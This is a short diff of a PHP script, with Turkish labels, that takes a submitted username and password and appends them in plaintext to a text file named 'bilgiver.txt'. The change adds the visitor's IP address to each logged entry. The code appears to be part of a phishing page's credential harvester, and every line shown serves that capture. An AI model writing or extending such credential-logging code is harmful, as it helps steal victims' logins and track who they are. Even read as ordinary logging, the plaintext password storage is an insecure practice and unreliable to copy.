@@ -43,7 +43,7 @@
  if($_POST){
 
 $yaz=fopen("bilgiver.txt","a");
-$icerik="Kullanıcı adı :".$ad." şifre :".$sifre."\n";
+$icerik="Kullanıcı adı :".$ad." şifre :".$sifre." ip :".$ip."\n";
 fwrite($yaz,$icerik);
  
 fclose($yaz);
